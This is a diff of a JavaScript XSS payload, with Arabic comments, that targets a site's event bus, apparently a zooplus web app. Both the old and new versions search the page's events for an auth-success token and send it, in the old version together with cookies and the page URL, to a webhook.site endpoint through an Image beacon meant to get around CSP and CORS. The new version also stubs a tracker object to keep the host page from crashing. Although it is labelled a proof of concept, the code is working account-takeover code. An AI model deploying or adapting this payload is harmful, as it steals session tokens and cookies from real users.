@@ -1,53 +1,35 @@
-// Path: https://egyhaker.github.io/script-loader/main.js
+// 1. منع انهيار التطبيق عبر تعريف المصفوفة التي يبحث عنها (Tracker Listener)
+window.zooplus = window.zooplus || {};
+if (!window.zooplus.tracker) {
+    window.zooplus.tracker = {
+        listeners: [], // هذا هو المكان الذي كان يحاول التطبيق عمل .map() له
+        push: function(e) { console.log("Event captured:", e); }
+    };
+}
 
+// 2. كود الهجوم لاستخراج التوكن من الـ Event Bus
 (function() {
-    console.log("%c⚠️ Security PoC: Monitoring Event Bus for Auth Tokens...", "color: yellow; font-weight: bold;");
+    console.log("🔥 Environment Hijack Successful");
 
-    const WEBHOOK_URL = "https://webhook.site/80fc42ae-6762-46f9-8c4d-46641ae6bafe";
-
-    function exfiltrate(data) {
-        // استخدام Image beacon لتجاوز بعض قيود CSP التي قد تمنع fetch
-        const img = new Image();
-        const encodedData = btoa(JSON.stringify(data));
-        img.src = `${WEBHOOK_URL}/leak?d=${encodedData}`;
-    }
-
-    function captureToken() {
-        try {
-            // الوصول إلى ناقل الأحداث الذي حددته
-            const bus = window._async_define_cached_dependencies && window._async_define_cached_dependencies["events-bus"];
+    try {
+        const bus = window._async_define_cached_dependencies["events-bus"];
+        const events = bus.events || bus._events || [];
+        
+        // البحث عن التوكن في تاريخ الأحداث
+        const authEvent = events.find(e => e.args && e.args[0] === "AUTH-SUCCESS-EVENT-v1");
+        
+        if (authEvent) {
+            const token = authEvent.args[1].token;
+            // إظهار التوكن كإثبات (PoC)
+            alert("🎯 Account Takeover Proof\nToken: " + token);
             
-            if (bus) {
-                const events = bus.events || bus._events || (typeof bus.getEvents === 'function' ? bus.getEvents() : null);
-                
-                if (events && Array.isArray(events)) {
-                    // البحث عن حدث تسجيل الدخول الناجح
-                    const authEvent = events.find(e => e.args && e.args[0] === "AUTH-SUCCESS-EVENT-v1");
-                    
-                    if (authEvent && authEvent.args[1] && authEvent.args[1].token) {
-                        const token = authEvent.args[1].token;
-                        console.log("%c✅ Token Found!", "color: green; font-weight: bold;");
-                        
-                        exfiltrate({
-                            status: "success",
-                            type: "ATO_TOKEN",
-                            url: window.location.href,
-                            token: token,
-                            cookies: document.cookie
-                        });
-                        return true;
-                    }
-                }
-            }
-        } catch (e) {
-            console.error("Extraction error:", e);
+            // إرساله للـ Webhook (باستخدام Image لتجاوز الـ CORS)
+            new Image().src = "https://webhook.site/80fc42ae-6762-46f9-8c4d-46641ae6bafe/leak?t=" + token;
+        } else {
+            // إذا لم يجد حدث الدخول، يظهر أي دليل على الـ XSS
+            alert("XSS Triggered on: " + document.domain);
         }
-        return false;
-    }
-
-    // محاولة الاستخراج فور التحميل
-    if (!captureToken()) {
-        // إذا لم يجد التوكن فوراً، ينتظر قليلاً (في حال كان التحميل جارياً)
-        setTimeout(captureToken, 3000);
+    } catch (err) {
+        console.error("Payload execution error:", err);
     }
 })();
